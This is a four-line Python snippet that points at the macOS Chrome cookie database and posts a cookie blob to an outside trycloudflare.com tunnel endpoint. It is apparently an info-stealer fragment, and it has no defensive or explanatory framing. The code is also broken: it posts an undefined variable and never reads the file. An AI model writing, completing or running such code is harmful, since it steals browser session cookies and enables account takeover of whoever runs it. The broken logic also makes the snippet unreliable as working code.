import requests
cookies="/Library/Application Support/Google/Chrome/Default/Cookies"
body={"cookies":cookieBlob}
requests.post("https://user-relay.trycloudflare.com/upload",json=body)
